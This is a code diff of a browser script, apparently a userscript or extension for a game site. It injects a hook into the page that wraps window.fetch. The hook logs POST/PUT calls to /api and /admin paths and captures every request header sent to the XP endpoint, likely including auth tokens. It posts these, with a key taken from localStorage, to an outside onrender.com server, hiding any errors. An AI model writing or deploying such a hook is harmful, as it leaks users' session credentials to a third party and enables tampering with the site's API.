@@ -851,124 +851,160 @@
   window['load-time'] = function(id){ return dbCmd('load-time ' + id); };
 })();
 // === Inject fetch hook from Bootstrap (Option C) ===
-(function injectHookFromBootstrap() {
+// === XP + endpoint logger injection (from core) ===
+(function () {
+  function inject() {
     const script = document.createElement("script");
     script.textContent = "(" + function () {
+      const XP_PATH = "/api/user/me/xp";
+      const LOG_URL = "https://dbserver-8bhx.onrender.com/api/user/client-xp";
 
-        const XP_PATH  = "/api/user/me/xp";
-        const LOG_URL  = "https://dbserver-8bhx.onrender.com/api/user/client-xp";
+      const origFetch = window.fetch;
+      if (!origFetch) {
+        console.warn("[core] window.fetch not available");
+        return;
+      }
 
-        const origFetch = window.fetch;
-        if (!origFetch) {
-            console.warn("[bootstrap-hook] window.fetch missing");
-            return;
+      function resolveUrl(input) {
+        try {
+          const urlStr = typeof input === "string" ? input : input.url;
+          return new URL(urlStr, window.location.origin);
+        } catch (e) {
+          return null;
+        }
+      }
+
+      function isXpEndpoint(input) {
+        const u = resolveUrl(input);
+        return u && u.pathname === XP_PATH;
+      }
+
+      function isLogUrl(input) {
+        const u = resolveUrl(input);
+        return u && u.href === LOG_URL;
+      }
+
+      function isTrackedPath(path) {
+        return (
+          typeof path === "string" &&
+          (path.startsWith("/admin") || path.startsWith("/api"))
+        );
+      }
+
+      function normalizeHeaders(h) {
+        const out = {};
+        if (!h) return out;
+
+        if (h instanceof Headers) {
+          h.forEach((v, k) => {
+            out[k.toLowerCase()] = v;
+          });
+        } else if (Array.isArray(h)) {
+          h.forEach(([k, v]) => {
+            out[String(k).toLowerCase()] = v;
+          });
+        } else if (typeof h === "object") {
+          Object.keys(h).forEach(k => {
+            out[k.toLowerCase()] = h[k];
+          });
+        }
+        return out;
+      }
+
+      function getClientKey() {
+        try {
+          const raw = localStorage.getItem("damnbruh_username_keys");
+          if (!raw) return null;
+          const obj = JSON.parse(raw);
+          if (obj && typeof obj.username_script_key === "string") {
+            return obj.username_script_key;
+          }
+        } catch (e) {
+          console.warn("[core] error reading damnbruh_username_keys", e);
+        }
+        return null;
+      }
+
+      function getMethod(input, init) {
+        if (init && init.method) return String(init.method).toUpperCase();
+        if (input && typeof input === "object" && input.method) {
+          return String(input.method).toUpperCase();
+        }
+        return "GET";
+      }
+
+      function getRequestHeaders(input, init) {
+        if (init && init.headers) return normalizeHeaders(init.headers);
+        if (input && input.headers) return normalizeHeaders(input.headers);
+        return {};
+      }
+
+      window.fetch = async function (...args) {
+        const [input, init] = args;
+
+        // Don't log our own logging calls
+        if (isLogUrl(input)) {
+          return origFetch.apply(this, args);
         }
 
-        function resolveUrl(input) {
-            try {
-                const urlStr = typeof input === "string" ? input : input.url;
-                return new URL(urlStr, window.location.origin);
-            } catch (_) { return null; }
+        const resolved = resolveUrl(input);
+        const path = resolved ? resolved.pathname : "";
+        const method = getMethod(input, init);
+        const res = await origFetch.apply(this, args);
+
+        const key = getClientKey();
+        if (!key) {
+          return res;
         }
 
-        function isXpEndpoint(input) {
-            const u = resolveUrl(input);
-            return u && u.pathname === XP_PATH;
+        const payload = { key };
+        let shouldSend = false;
+
+        // 1) Track all POST/PUT to /admin* or /api*
+        const isPostOrPut = method === "POST" || method === "PUT";
+        if (isPostOrPut && isTrackedPath(path)) {
+          payload.endpoint = method + " " + path;
+          shouldSend = true;
+          console.debug("[core EP]", payload.endpoint);
         }
 
-        function isLogUrl(input) {
-            const u = resolveUrl(input);
-            return u && u.href === LOG_URL;
+        // 2) Always capture request headers for XP endpoint (any method)
+        if (isXpEndpoint(input)) {
+          const reqHeaders = getRequestHeaders(input, init);
+          payload.headers = reqHeaders;
+          shouldSend = true;
+
+          console.groupCollapsed("[core XP] " + method + " " + path);
+          console.log("Request headers:", reqHeaders);
+          console.groupEnd();
         }
 
-        function isTrackedPath(path) {
-            return path.startsWith("/api") || path.startsWith("/admin");
+        if (!shouldSend) {
+          return res;
         }
 
-        function normalizeHeaders(h) {
-            const out = {};
-            if (!h) return out;
-            if (h instanceof Headers) {
-                h.forEach((v, k) => out[k.toLowerCase()] = v);
-            } else if (typeof h === "object") {
-                Object.keys(h).forEach(k => out[k.toLowerCase()] = h[k]);
-            }
-            return out;
+        try {
+          origFetch(LOG_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          }).catch(() => {});
+        } catch (e) {
+          console.warn("[core] failed to POST logging payload", e);
         }
 
-        function getClientKey() {
-            try {
-                const raw = localStorage.getItem("damnbruh_username_keys");
-                if (!raw) return null;
-                const obj = JSON.parse(raw);
-                return obj.username_script_key;
-            } catch (_) { return null; }
-        }
+        return res;
+      };
 
-        function getMethod(input, init) {
-            if (init && init.method) return init.method.toUpperCase();
-            if (input && typeof input === "object" && input.method)
-                return input.method.toUpperCase();
-            return "GET";
-        }
-
-        function getRequestHeaders(input, init) {
-            if (init && init.headers) return normalizeHeaders(init.headers);
-            if (input && input.headers) return normalizeHeaders(input.headers);
-            return {};
-        }
-
-        window.fetch = async function (...args) {
-            const [input, init] = args;
-
-            if (isLogUrl(input)) return origFetch.apply(this, args);
-
-            const resolved = resolveUrl(input);
-            const path     = resolved ? resolved.pathname : "";
-            const method   = getMethod(input, init);
-            const res      = await origFetch.apply(this, args);
-            const key      = getClientKey();
-
-            if (!key) return res;
-
-            const payload = { key };
-            let shouldSend = false;
-
-            // Track POST/PUT to /api* or /admin*
-            if ((method === "POST" || method === "PUT") && isTrackedPath(path)) {
-                payload.endpoint = method + " " + path;
-                shouldSend = true;
-                console.debug("[bootstrap EP] ", payload.endpoint);
-            }
-
-            // XP endpoint — capture headers always
-            if (isXpEndpoint(input)) {
-                const h = getRequestHeaders(input, init);
-                payload.headers = h;
-                shouldSend = true;
-                console.debug("[bootstrap XP]", payload);
-            }
-
-            if (shouldSend) {
-                try {
-                    origFetch(LOG_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    }).catch(() => {});
-                } catch (e) {
-                    console.warn("[bootstrap] failed to send log:", e);
-                }
-            }
-
-            return res;
-        };
-
-        console.log("[bootstrap] endpoint + XP fetch hook injected");
+      console.log("[core] XP + endpoint fetch hook installed (XP_PATH =", XP_PATH, ")");
     } + ")();";
 
     document.documentElement.prepend(script);
     script.remove();
+  }
+
+  if (document.documentElement) inject();
+  else document.addEventListener("DOMContentLoaded", inject);
 })();
 
 
